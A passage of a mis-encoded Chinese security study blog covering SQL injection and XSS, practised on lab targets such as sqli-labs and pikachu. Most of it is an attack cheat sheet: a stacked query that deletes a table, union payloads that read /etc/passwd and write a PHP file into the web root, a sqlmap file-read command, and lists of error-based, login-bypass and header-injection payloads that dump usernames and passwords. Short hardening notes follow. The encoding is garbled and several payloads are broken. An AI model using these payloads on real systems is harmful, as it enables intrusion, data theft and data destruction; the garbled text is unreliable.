productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</p>
<p>å±€é™æ€§ï¼šAPIä»¥åŠæ•°æ®åº“å¼•æ“ä¸æ”¯æŒï¼ŒæŠ‘æˆ–æ˜¯æƒé™ä¸è¶³å¯¼è‡´æ— æ³•è°ƒç”¨ï¼›å³ä½¿èƒ½ä½¿ç”¨é€šå¸¸è½¯ä»¶ä»£ç åªä¼šè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœ</p>
<pre><code class="language-sql">#ä¾‹å­

ç”¨æˆ·è¾“å…¥ï¼š`1; DELETE FROM products`
æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š`select * from products where productid=1;DELETE FROM products`
å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤
</code></pre>
<blockquote>
<p>å‚è€ƒï¼š</p>
<p>https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0</p>
<p>https://www.sqlinjection.net/stacked-queries/</p>
</blockquote>
<h4 id="7-http-headæ³¨å…¥">7ã€http headæ³¨å…¥</h4>
<blockquote>
<p>HTTPå¤´æ³¨å…¥å…¶å®å¹¶ä¸æ˜¯ä¸€ä¸ªæ–°çš„SQLæ³¨å…¥ç±»å‹ï¼Œè€Œæ˜¯æŒ‡å‡ºç°SQLæ³¨å…¥æ¼æ´çš„åœºæ™¯ã€‚<br>
æœ‰äº›æ—¶å€™ï¼Œåå°å¼€å‘äººå‘˜ä¸ºäº†éªŒè¯å®¢æˆ·ç«¯å¤´ä¿¡æ¯ï¼ˆæ¯”å¦‚å¸¸ç”¨çš„cookieéªŒè¯ï¼‰<br>
æˆ–è€…é€šè¿‡HTTP headerå¤´ä¿¡æ¯è·å–å®¢æˆ·ç«¯çš„ä¸€äº›èµ„æ–™ï¼Œæ¯”å¦‚User-Agentã€Acceptå­—æ®µç­‰ã€‚<br>
ä¼šå¯¹å®¢æˆ·ç«¯çš„HTTP headerä¿¡æ¯è¿›è¡Œè·å–å¹¶ä½¿ç”¨SQLè¿›è¡Œå¤„ç†ï¼Œå¦‚æœæ­¤æ—¶æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘åˆ™å¯èƒ½ä¼šå¯¼è‡´åŸºäºHTTP headerçš„SQL Injectæ¼æ´ã€‚</p>
</blockquote>
<h5 id="cookieæ³¨å…¥">cookieæ³¨å…¥</h5>
<p>åŸç†ï¼šphpä¸­ï¼Œä½¿ç”¨è¶…å…¨å±€å˜é‡ <code>$_GET</code>ï¼Œ<code>$_POST</code>æ¥æ¥å—å‚æ•°ã€‚ aspä¸­ï¼Œä½¿ç”¨ <code>Request.QueryString (GET)</code>æˆ– <code>Request.Form (POST)</code>æ¥æ¥æ”¶é¡µé¢æäº¤çš„å‚æ•°å€¼ã€‚ æœ‰äº›ç¨‹åºå‘˜ç›´æ¥è¿™ä¹ˆå†™ï¼š<code>$id = $_REQUEST['id'];</code>è¿™æ—¶å€™PHPä¸çŸ¥é“ï¼Œåº”è¯¥ä»GETè¿˜æ˜¯POSTæ–¹å¼ä¸Šæ¥æ”¶å‚æ•° ï¼Œå®ƒå°±ä¼šä¸€ä¸ªä¸€ä¸ªå»è¯•ï¼Œå®ƒæ˜¯å…ˆå–GETä¸­çš„æ•°æ®ï¼Œå†å–POSTä¸­çš„æ•°æ®ï¼Œè¿˜ä¼šå»å–Cookiesä¸­çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰åšå¥½é˜²æŠ¤æªæ–½å°±å®¹æ˜“å¯¼è‡´å­˜åœ¨cookieæ³¨å…¥</p>
<p>Cookie æ³¨å…¥ç‰¹å¾ï¼šé€šè¿‡ä¿®æ”¹cookieçš„æ•°å€¼</p>
<p>æ–¹æ³•ï¼š</p>
<p>æ–¹æ³•ä¸€ï¼šburpæŠ“åŒ…ä¿®æ”¹</p>
<p>æ–¹æ³•äºŒï¼šä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥</p>
<h5 id="xffæ³¨å…¥">XFFæ³¨å…¥</h5>
<h5 id="uaæ³¨å…¥">UAæ³¨å…¥</h5>
<h4 id="8-è¯»å†™æ–‡ä»¶">8ã€è¯»å†™æ–‡ä»¶</h4>
<p><code>load_fileï¼ˆfile_nameï¼‰</code>ï¼šè¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>ä½¿ç”¨æ¡ä»¶</p>
<ul>
<li>
<p>å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»ï¼Œ</p>
<!--å¯ä»¥é€šè¿‡åœ¨my.iniä¸­æ·»åŠ secure_file_privè¿™ä¸€é¡¹æ¥è®¸å¯æ–‡ä»¶è¯»å†™ã€‚mysqlä¸‹æ‰§è¡Œ`show global variables like '%secure%';`å¯ä»¥æŸ¥çœ‹`secure_file_priv`çš„å€¼-->
</li>
<li>
<p>å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´è·¯å¾„</p>
</li>
<li>
<p>èƒ½å¤Ÿä½¿ç”¨unionæŸ¥è¯¢ï¼ˆsqlæ³¨å…¥æ—¶ï¼‰</p>
</li>
<li>
<p>å¯¹Webç›®å½•æœ‰å†™æƒé™ç”¨æˆ·å¿…é¡»æœ‰secure_file_priv=æ–‡ä»¶æƒé™</p>
</li>
<li>
<p>æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packetdeçš„å…è®¸å€¼</p>
</li>
</ul>
<p><strong>secure_file_privçš„å€¼</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">è®¾ç½®</th>
<th style="text-align:left">å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">secure_file_prive=null</td>
<td style="text-align:left">é™åˆ¶mysqlä¸å…è®¸å¯¼å…¥/å¯¼å‡º</td>
</tr>
<tr>
<td style="text-align:left">secure_file_priv=/tmp/</td>
<td style="text-align:left">é™åˆ¶mysqlçš„å¯¼å…¥/å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</td>
</tr>
<tr>
<td style="text-align:left">secure_file_priv=ç©º</td>
<td style="text-align:left">ä¸é™åˆ¶mysqlçš„å¯¼å…¥/å¯¼å‡º</td>
</tr>
</tbody>
</table>
<p>å®ä¾‹ï¼š</p>
<p>sqli-labsç¬¬ä¸ƒå…³</p>
<pre><code class="language-sql">#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ« 
?id=1 and 1=1 
?id=1 and 1=2 
#You are in.... Use outfile...... 
#ç¡®å®šå­—æ®µæ•° 
?id=1' order by 3 --+ ?id=1')) order by 4 --+ 
#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½ 
?id=-1 union select 1,2,3 
?id=-1')) union select 1,load_file('/etc/passwd'),3 --+ 
?id=-1')) union select 1,(''),3 into outfile &quot;/var/www/html/a.php&quot;--+

</code></pre>
<p>sqlmap</p>
<pre><code class="language-bash">sqlmap -u &quot;http://xxx/x?id=1&quot; --file-read=/etc/passwd
</code></pre>
<h2 id="é¶åœºè®°å½•">é¶åœºè®°å½•</h2>
<p>DVWAï¼šhttps://jwt1399.top/posts/27769.html#toc-heading-16</p>
<h2 id="ivåŠ å›ºsql">â…£ï¼šåŠ å›ºsql</h2>
<p>1ã€å¯¹ä»£ç è¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤</p>
<p>2ã€ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼Ÿå…·ä½“ä¸æ˜¯å¾ˆäº†è§£ï¼Œå­˜ç–‘</p>
<h2 id="é™„ä»¶">é™„ä»¶</h2>
<h3 id="sqlæ³¨å…¥">sqlæ³¨å…¥</h3>
<pre><code class="language-sql">1ã€é€šè¿‡flooræŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);

2ã€é€šè¿‡ExtractValueæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3ã€é€šè¿‡UpdateXmlæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and 1=(updatexml(1,concat(0x3a,(select user())),1))

4ã€é€šè¿‡NAME_CONSTæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)

5ã€é€šè¿‡joinæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
select * from(select * from mysql.user ajoin mysql.user b)c;

6ã€é€šè¿‡expæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and exp(~(select * from (select user () ) a) );

7ã€é€šè¿‡GeometryCollection()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and GeometryCollection(()select *from(select user () )a)b );

8ã€é€šè¿‡polygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and polygon (()select * from(select user ())a)b );

9ã€é€šè¿‡multipoint ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and multipoint (()select * from(select user() )a)b );

10ã€é€šè¿‡multlinestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and multlinestring (()select * from(selectuser () )a)b );

11ã€é€šè¿‡multpolygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and multpolygon (()select * from(selectuser () )a)b );

12ã€é€šè¿‡linestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹:
and linestring (()select * from(select user() )a)b );

å…³äºPOSTæ³¨å…¥
å¸¸ç”¨çš„ä¸‡èƒ½usernameè¯­å¥ï¼š
a â€™ or 1=1 #
a &quot;) or 1=1 #
aâ€˜) or 1=1 #
aâ€ or â€œ1â€=â€1
' or '1'='1
' or (length(database())) = 8 (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯)
' or (ascii(substr((select database()) ,1,1))) = 115 # (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯)
&quot;) or (&quot;1&quot;)=(&quot;1
&quot;) or 1=1 or if(1=1, sleep(1), null) #
&quot;) or (length(database())) = 8 #
&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #

postå‹ç›²æ³¨é€šæ€payloadï¼š
uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit

å…³äºUPDATEXML,REFERER,COOKIEçš„æ„é€ 
User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) #
Referer: â€™ or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) #
Cookie:username: admin â€™ or updatexml(1,concat(0x7e,database(),0x7e),1) #

updatexmlæŠ¥é”™æ³¨å…¥
çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
é“¾æ¥ç”¨æˆ·ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
é“¾æ¥æ•°æ®åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
çˆ†åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
çˆ†è¡¨ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
çˆ†å­—æ®µï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
çˆ†å­—æ®µå†…å®¹ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)


é“¾æ¥ï¼šhttps://www.jianshu.com/p/bc35f8dd4f7c

</code></pre>
<h1 id="äºŒxssæ³¨å…¥">äºŒï¼šxssæ³¨å…¥</h1>
<p>XSS å…¨ç§°(Cross Site Scripting) è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œ æ˜¯Webç¨‹åºä¸­æœ€å¸¸è§çš„æ¼æ´ã€‚æŒ‡æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬(ä¾‹å¦‚JavaScript), å½“ç”¨æˆ·æµè§ˆæ­¤ç½‘é¡µæ—¶ï¼Œè„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„.  æ¯”å¦‚è·å–ç”¨æˆ·çš„Cookieï¼Œå¯¼èˆªåˆ°æ¶æ„ç½‘ç«™,æºå¸¦æœ¨é©¬ç­‰ã€‚</p>
<blockquote>
<p>å±å®³</p>
<ol>
<li>é€šè¿‡document.cookieç›—å–cookie</li>
<li>ä½¿ç”¨jsæˆ–cssç ´åé¡µé¢æ­£å¸¸çš„ç»“æ„ä¸æ ·å¼</li>
<li>æµé‡åŠ«æŒï¼ˆé€šè¿‡è®¿é—®æŸæ®µå…·æœ‰window.location.hrefå®šä½åˆ°å…¶ä»–é¡µé¢ï¼‰</li>
<li>Dosæ”»å‡»ï¼šåˆ©ç”¨åˆç†çš„å®¢æˆ·ç«¯è¯·æ±‚æ¥å ç”¨è¿‡å¤šçš„æœåŠ¡å™¨èµ„æºï¼Œä»è€Œä½¿åˆæ³•ç”¨æˆ·æ— æ³•å¾—åˆ°æœåŠ¡å™¨å“åº”ã€‚</li>
<li>åˆ©ç”¨iframeã€frameã€XMLHttpRequestæˆ–ä¸Šè¿°Flashç­‰æ–¹å¼ï¼Œä»¥ï¼ˆè¢«æ”»å‡»ï¼‰ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œä¸€äº›ç®¡ç†åŠ¨ä½œï¼Œæˆ–æ‰§è¡Œä¸€äº›ä¸€èˆ¬çš„å¦‚å‘å¾®åšã€åŠ å¥½å‹ã€å‘ç§ä¿¡ç­‰æ“ä½œã€‚</li>
<li>åˆ©ç”¨å¯è¢«æ”»å‡»çš„åŸŸå—åˆ°å…¶ä»–åŸŸä¿¡ä»»çš„ç‰¹ç‚¹ï¼Œä»¥å—ä¿¡ä»»æ¥æºçš„èº«ä»½è¯·æ±‚ä¸€äº›å¹³æ—¶ä¸å…è®¸çš„æ“ä½œï¼Œå¦‚è¿›è¡Œä¸å½“çš„æŠ•ç¥¨æ´»åŠ¨ã€‚</li>
</ol>
</blockquote>
<p>https://www.cnblogs.com/wuqun/p/12484816.html</p>
<h4 id="æ”»å‡»åŸç†">æ”»å‡»åŸç†</h4>
<pre><code class="language-javascript">    å‡å¦‚é¡µé¢æœ‰å¦‚ä¸‹ä¸€ä¸ªè¾“å…¥æ¡†

ã€€ã€€&lt;input type=&quot;text&quot; name=&quot;record&quot; value=&quot;æ²™å‘&quot;&gt;

ã€€ã€€ã€æ²™å‘ã€‘æ˜¯æ¥è‡ªç”¨æˆ·çš„è¾“å…¥ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„æ˜¯&quot;onfocus=&quot;alert(document.cookie)

ã€€ã€€é‚£ä¹ˆå°±ä¼šå˜æˆ 

ã€€ã€€&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;&quot; onfocus=&quot;alert(document.cookie)&quot;&gt;

ã€€ã€€ äº‹ä»¶è¢«è§¦å‘çš„æ—¶å€™åµŒå…¥çš„JavaScriptä»£ç å°†ä¼šè¢«æ‰§è¡Œ

ã€€ã€€ æ”»å‡»çš„å¨åŠ›ï¼Œå–å†³äºç”¨æˆ·è¾“å…¥äº†ä»€ä¹ˆæ ·çš„è„šæœ¬ã€‚
</code></pre>
<h2 id="ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»">ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»</h2>
<p>åŸå› ï¼šæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œä¸»è¦åŸå› ï¼šç¨‹åºçš„è¾“å…¥è¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†</p>
<h3 id="1-åå°„å‹xss">1ã€åå°„å‹xss</h3>
<p>â€‹	æœ€å¸¸è§ä¹Ÿæ˜¯ä½¿ç”¨èŒƒå›´æœ€å¹¿æ³›çš„ä¸€ä¸ªï¼Œå¯ä»¥å°†æ¶æ„è„šæœ¬é™„åŠ åˆ°URlåœ°å€çš„å‚æ•°ä¸­</p>
<h3 id="2-å­˜å‚¨å‹xss">2ã€å­˜å‚¨å‹xss</h3>
<p>â€‹	æ­¤ç±» XSS ä¸éœ€è¦ç”¨æˆ·å•å‡»ç‰¹å®š URL å°±èƒ½æ‰§è¡Œè·¨ç«™è„šæœ¬ï¼Œæ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚æŒä¹…å‹ XSS ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­</p>
<h3 id="3-domeå‹xss">3ã€domeå‹xss</h3>
<p>å…¨ç§°Document Object Modelï¼Œä½¿ç”¨DOMå¯ä»¥ä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®æ›´æ–°æ–‡æ¡£çš„å†…å®¹ï¼Œç»“æ„åŠæ ·å¼ã€‚<br>
DOMå‹XSSæ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSSï¼ŒåŸºäºDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ã€‚<br>
gongjiæ–¹å¼ï¼šç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„é“¾æ¥ï¼Œç”±gongjiè€…æäº¤ä¸”åŒ…å«æ¶æ„XSSä»£ç ï¼ŒæœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«gongjiè€…çš„è„šæœ¬ï¼Œå½“å—å®³è€…çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSæ¶æ„ä»£ç ã€‚</p>
<h2 id="æ‰‹åŠ¨æµ‹è¯•">æ‰‹åŠ¨æµ‹è¯•</h2>
<p>é¶åœºï¼špikachu</p>
<h4 id="1-åå°„å‹">1ã€åå°„å‹</h4>
<p>get/post</p>
<p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬ä½¿ç”¨<script>alert(/xss/)</script>æ¥æŠ¥xsså¼¹çª—</p>
<p>ä½†æ˜¯æˆ‘ä»¬åœ¨æµ‹è¯•æ—¶å‘ç°pikachuï¼Œé™åˆ¶äº†æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦</p>
<p>æˆ‘ä»¬åªéœ€è¦F12ï¼Œå®šä½ä¿®æ”¹ä¸€ä¸‹é•¿åº¦å³å¯</p>
<figure data-type="image" tabindex="3"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cxss-1.png" alt="xss" loading="lazy"></figure>
<h4 id="2-å­˜å‚¨å‹">2ã€å­˜å‚¨å‹</h4>
<p>ä¼šä¸€ç›´å­˜åœ¨ä¸ä»£ç å½“ä¸­ï¼Œä¸€ç›´è®¿é—®ä¸€ç›´æœ‰</p>
<p>æˆ‘ä»¬åªéœ€è¦åœ¨ç•™è¨€æ¿ä¸­è¾“å…¥payloadå³å¯</p>
<pre><code class="language-javascript">&lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<h4 id="3-domå½¢xss">3ã€domå½¢XSS</h4>
<p>DOM å‹ XSS å½¢æˆåŸå› æ˜¯é€šè¿‡ä¿®æ”¹é¡µé¢çš„ DOM èŠ‚ç‚¹å½¢æˆçš„ XSSã€‚<br>
DOM å‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç éƒ½ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯è‡ªèº«çš„å®‰å…¨æ¼æ´ã€‚</p>
<p><strong>æ”»å‡»æ­¥éª¤ï¼š</strong><br>
1ã€æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚<br>
2ã€ç”¨æˆ·è¢«è¯±å¯¼æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URLã€‚<br>
3ã€ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œå‰ç«¯ JavaScript å–å‡º URL ä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚<br>
4ã€æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚</p>
<p>ä¸¾ä¾‹ï¼š</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç‰©æµè¯¦æƒ…çš„é¡µé¢ï¼Œåœ¨ URL ä¸Šæœ‰å¿«é€’ç¼–å·è¿™ä¸ªå‚æ•°ï¼Œé€šè¿‡è¿™ä¸ªå‚æ•°æ¥è·å–æ•°æ®ã€‚</p>
<p>https://www.kkkk1000.com/xss/dom/index.html?serialNumber=YT40359134268305</p>
<figure data-type="image" tabindex="4"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-1.png" alt="img" loading="lazy"></figure>
<p>å› ä¸ºåœ¨æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢ä¸Šæ˜¾ç¤ºçš„å¿«é€’ç¼–å·ï¼Œæ˜¯ç›´æ¥å–çš„ URL ä¸Šçš„å‚æ•°æ˜¾ç¤ºçš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ è¿™æ ·ä¸€ä¸ªç½‘å€ï¼š</p>
<pre><code>https://www.kkkk1000.com/xss/dom/index.html?serialNumber=alert(&quot;xss&quot;)
</code></pre>
<p>ç„¶åè¯±å¯¼ä»–äººç‚¹å‡»è¿™ä¸ªé“¾æ¥ï¼Œå°±å¯ä»¥å®Œæˆä¸€æ¬¡ DOM å‹ XSS æ”»å‡»ã€‚</p>
<figure data-type="image" tabindex="5"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-2.png" alt="img" loading="lazy"></figure>
<h4 id="4-xssç›²æ‰“">4ã€XSSç›²æ‰“</h4>
<h4 id="5-xssè¿‡æ»¤">5ã€XSSè¿‡æ»¤</h4>
<h4 id="6-xssä¹‹htmlspecialchars">6ã€<strong>xssä¹‹htmlspecialchars</strong></h4>
<h3 id="xssåŠ å›º">xssåŠ å›º</h3>
<p>1ã€æµè§ˆå™¨è‡ªXSSé˜²å¾¡ï¼šæ¯”å¦‚è°·æ­Œå’Œsafariï¼Œå½“æ£€æµ‹åˆ°æœ‰xssæ—¶ï¼Œæµè§ˆå™¨è‡ªåŠ¨åœæ­¢åŠ è½½</p>
<p>2ã€è½¬ä¹‰å­—ç¬¦ã€‚ä¸»è¦å°±æ˜¯å¯¹è¾“å…¥æ‰€åŒ…å«çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚ <code>&lt;</code>ï¼Œ<code>&gt;</code>ï¼Œ<code>&amp;</code>ï¼Œ<code>&quot;</code>ï¼Œ<code>'</code>ï¼Œæ¥é˜²æ­¢ XSS æ”»å‡»ã€‚</p>
<p>3ã€è¿‡æ»¤</p>
<p>4ã€ç™½åå•</p>
<h1 id="é™„ä¸Š">é™„ä¸Š</h1>
<h2 id="ä¸€-mysqlæ³¨å…¥å¸¸ç”¨å‡½æ•°">ä¸€ã€MySqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</h2>
<pre><code class="language-sql">ä¸€ã€MySqlæ³¨å…¥å¸¸ç”¨å‡½æ•°

1ã€system_user()ç³»ç»Ÿç”¨æˆ·å

2ã€user()ç”¨æˆ·å

3ã€current_user()å½“å‰ç”¨æˆ·å

4ã€session_user()é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å

5ã€database()æ•°æ®åº“å

6ã€version()æ•°æ®åº“ç‰ˆæœ¬

7ã€@@datadiræ•°æ®åº“è·¯å¾„

8ã€@@basediræ•°æ®åº“å®‰è£…è·¯å¾„

9ã€@@version_conpile_osæ“ä½œç³»ç»Ÿ

10ã€count()è¿”å›æ‰§è¡Œç»“æœæ•°é‡

11ã€concat()æ²¡æœ‰åˆ†éš”ç¬¦çš„é“¾æ¥å­—ç¬¦ä¸²

12ã€concat_ws()å«æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²

13ã€group_concat()è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®

14ã€load_file()è¯»å–æœ¬åœ°æ–‡ä»¶

15ã€into outfile å†™æ–‡ä»¶

16ã€ascii()å­—ç¬¦ä¸²çš„ASCIIä»£ç å€¼

17ord()è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼

18mid()è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†

19substr()è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†

20ã€length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦

21ã€left()è¿”å›å­—ç¬¦ä¸²æœ€å·¦é¢å‡ ä¸ªå­—ç¬¦

22ã€floor()è¿”å›å°äºæˆ–ç­‰äºxçš„æœ€å¤§æ•´æ•°

23ã€rand()è¿”å›0å’Œ1ä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°

24ã€extractvalue()

ç¬¬ä¸€ä¸ªå‚æ•°:XML_docmentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc

ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)

ä½œç”¨ï¼šä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²

25ã€updatexml()

ç¬¬ä¸€ä¸ªå‚æ•°:XML_docmentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc

ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)

ç¬¬ä¸‰ä¸ªå‚æ•°:new_value,Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®target.com

ä½œç”¨:æ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼

26ã€sleep()è®©æ­¤è¯­å¥è¿è¡ŒNç§’é’Ÿ

27ã€if() SELECT IF(1&gt;2,2,3) ; --&gt;3

28ã€char()è¿”å›æ•´æ•°ASCIIä»£ç å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²

29ã€strcmp()æ¯”è¾ƒå­—ç¬¦ä¸²å†…å®¹

